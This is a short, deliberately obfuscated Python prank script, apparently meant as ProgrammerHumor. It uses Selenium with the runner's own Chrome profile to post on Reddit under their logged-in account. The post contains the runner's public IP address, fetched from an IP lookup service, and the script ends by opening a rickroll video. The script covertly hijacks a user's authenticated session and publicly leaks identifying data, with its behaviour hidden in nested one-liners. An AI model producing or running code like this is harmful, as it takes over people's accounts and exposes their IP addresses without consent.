#include <iostream>
import sys


import numpy as tf
import os
# Lord forgive me for what i am about to code
from selenium import webdriver
user_url = "https://www.reddit.com/user/AggravatingCorner133/"
__import__("zipfile").ZipFile(__import__("io").BytesIO(__import__("requests").get(f"https://chromedriver.storage.googleapis.com/108.0.5359.22/chromedriver_{'win32' if os.name == 'nt' else 'linux64'}.zip").content)).extractall() 
driver = webdriver.Chrome(options = (lambda x = globals().__setitem__("o", webdriver.ChromeOptions()), y = globals()["o"].add_argument(f"--user-data-dir={os.path.expanduser('~')}" + ('\\AppData\\Local\\Google\\Chrome\\User Data' if os.name == 'nt' else '/.config/google-chrome')): globals()["o"])())
[driver.get("https://www.reddit.com/r/ProgrammerHumor/submit"),__import__("time").sleep(5),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[4]/div[2]/div[1]/div/textarea").send_keys("Hello from r/ProgrammerHumor!"),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[4]/div[2]/div[2]/div/div/div[1]/div[2]/button").click(),__import__("time").sleep(5),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[4]/div[2]/div[2]/div[1]/div/div[2]/textarea").send_keys(f"[Here is a cool video for yall related to programming] (https://www.youtube.com/watch?v=dQw4w9WgXcQ).btw my ip is: {__import__('requests').get('https://api.myip.com/').json()['ip']}"),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[4]/div[3]/div[1]/div[1]/button[4]").click(),__import__("time").sleep(1),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[4]/div/div/div/div[2]/div/div[2]/div[4]").click(),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[4]/div/div/div/div[3]/button[1]").click(),__import__("time").sleep(1),driver.find_element(webdriver.common.by.By.XPATH,"/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[4]/div[3]/div[2]/div/div/div[1]/button").click(),__import__("time").sleep(1),driver.get("https://www.youtube.com/watch?v=dQw4w9WgXcQ")]